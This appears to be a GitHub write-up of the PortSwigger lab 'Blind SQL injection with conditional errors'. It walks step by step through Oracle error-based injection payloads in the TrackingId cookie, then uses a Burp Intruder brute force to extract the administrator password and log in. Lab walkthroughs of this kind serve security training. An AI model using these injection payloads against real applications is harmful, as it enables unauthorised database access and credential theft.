## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/29df022f3c272f121a31dcaeb289e3dfc834ea9f/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/Lab%20Description.png)


## Solution :

Request looks like this 

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/a8fcb363598971966046bff1c7cd8a54f82502f8/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/Initial%20Tracking.png)

Query looks like the following 

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```

#### Inducing error message -

1. Add an extra `'` symbol. We see that error appears because of incorrect ssql syntax 

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/e3c2f5a482396f0ede193f53680a0668fe84c744/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/Adding%20Single%20Apostrophe.png)


2. Add 2 extra `'` symbol, we get a response  back which indicates that the sql syntax is correct ('' indicates opening and closing of query & hence correct sql query)

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'''
```
![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/9efabb8a988ec359ef207c9ab1c2a4d7053984f4/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/Adding%20Double%20Apostrophe.png)


#### Conform the reason for error is invalid SQL query -

1. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting: `TrackingId=xyz'||(SELECT '')||'`

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/3cbca3445c77858a32a5bd4ac7c53706a54d22fd/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/Trial%20Check%20Error%20Confirm.png)


In this case, notice that the query still appears to be invalid. This may be because the database used here is **ORACLE** & for that we need to specify a table called **DUAL**. Hence we got this error.

2. Try specifying a predictable table name in the query: `TrackingId=xyz'||(SELECT '' FROM dual)||'`


![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/729f9cdaae70adbadfee8b91bcc2bee30f53cc8e/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/Predicting%20Table%20Name%20in%20Oracle%20Database.png)

We get  a response without any error , we can confrom that it is an ORACLE database *which requires all SELECT statements to explicitly specify a table name*. 

3. To conform this we can give an invalid query by specifying some random table `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/b7c1a44e91fed1493a4ba5a16f7e718782c8f59e/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/Providing%20Invalid%20Table%20Name.png)

Hence confirmed.

#### Verify users table exist -

We can verify whether *users* table exist or not by the following command `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`


![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/72db2a8e2c69219c7050c3f6ebd958fd908658ff/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/Verify%20Users%20Table%20Exists.png)

No error -> implies that users table exist.

> NOTE - Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break > our concatenation. 

#### Checking whether administrator user is present in db -

We can exploit this error inducing queries to test if admin user is present or not

1. Set **(1=1)** ie. Condition is TRUE - `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/596ec470799157b76ecacf0d8163284197e31d73/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/True%20Condition%20-%20Admin%20User%20Check.png)

We receive an error. means the condition is *TRUE* so it threw an **divide by 0** error

2. Set **(1=2)** ie. Condition is FALSE - `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/fc5173f808df7df61c111e775005e49abee5fdb6/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/False%20Condition%20-%20Admin%20User%20Check.png)

We get a 200 response , means the condition failed and hence it returned nothing !

> NOTE- This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition 
> and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains
> a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the
> condition is true.

3. We can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username *administrator* exists: 

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/1141ffc5428e41147126b8f97ffd551e34c9b07e/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/Check%20for%20Username%20Administrator.png)

It shows an error which means there is indeed a user called *administrator*

#### Determine the length of admin's password -

```sql
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

RESPONSE -

1. ERROR -> Condition is TRUE
2. NUlll response -> Condition is FALSE

The length of password will be definitly > 1 , so we get an error.

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/b0e27091a9d91f7dfa2ca2c2584ac6e9197460aa/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/Check%20for%20Password%20Length.png)

AUTOMATE THIS by Burp Intruder , by adding password length *(LENGTH>1)* as payload .

From req 20, we get an error where condition is *(LENGTH > 20)*

![image]()

This means that the password size is exactly **20** characters.

#### Bruteforce the admin's password -

```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,$1$,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Add the length of password & each letter to be bruteforced as payloads.

ATTACK TYPE - CLUSTER BOMB
Payload 1 - Numbers
Payload 2 - Bruteforcer

We get the 20 responses which returned a error.

![image]()


Thus we got the admin's password - `8fysuozl95mngaem0abi`

Now we can log in as administrator ,

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/2a9148d5da3c6f65473ae99d94c4082f32ac8dcb/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/Lab%20Solution.png)




















